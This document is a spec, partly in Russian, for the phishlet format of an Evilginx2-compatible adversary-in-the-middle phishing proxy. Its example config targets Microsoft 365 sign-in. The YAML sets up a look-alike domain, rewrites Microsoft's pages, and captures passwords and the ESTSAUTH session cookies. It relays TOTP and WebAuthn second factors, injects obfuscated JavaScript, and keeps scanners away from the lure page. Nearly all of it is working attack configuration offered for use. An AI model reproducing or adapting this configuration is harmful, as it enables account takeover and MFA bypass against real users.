# Phishlet v2 spec (frozen)

Версия спека: `v2`. Совместим по полям с Evilginx2, плюс `base_domains` и `lure_path`.

```yaml
id: microsoft365            # required, [a-z0-9_-]+
version: 2                  # required, == 2
base_domains:               # required, min 1. Поддержка wildcard Evilginx Pro multi-domain
  - "login.example.com"
proxy_hosts:                # required, min 1
  - phish_sub: "login"      # поддомен на нашей стороне
    orig_sub: "login"       # поддомен оригинала
    domain: "microsoftonline.com"
    is_landing: true
sub_filters:                # замена в теле/ответах
  - triggers_on: "login.microsoftonline.com"
    search: "login.microsoftonline.com"
    replace: "login.example.com"
    mime: ["text/html", "application/json"]
    redirect_only: false
auth_tokens:                # какие cookie считать захватом сессии
  - domain: ".microsoft.com"
    keys: ["ESTSAUTH", "ESTSAUTHPERSISTENT"]
creds_map:                  # какие POST-поля считать логином/паролем
  - key: "login"
    search: "login"
  - key: "passwd"
    search: "passwd"
mfa_tokens:                 # второй фактор: TOTP/Push/WebAuthn ceremony relay
  - key: "totp"             # (приватники WebAuthn origin-bound — ретранслируем
    search: "totp_code"     #  ceremony-трафик + фиксируем kind=mfa:<key>)
  - key: "webauthn"
    search: "authenticatorAssertionResponse"
js_inject:
  - trigger: "login.microsoftonline.com"
    src: "botguard.js"      # обфусцируется движком (Pro: obfuscation)
lure_path: "/l/login01"     # путь-приманка, остальное -> spoof/blacklist
enabled: true
```

Правила валидации:
- `id` уникален, `proxy_hosts` не пересекаются по `phish_sub.domain` между phishlets.
- `search != replace`, `mime` из белого списка.
- Все внешние URL только через `proxy_hosts`/`sub_filters`, хардкода нет.
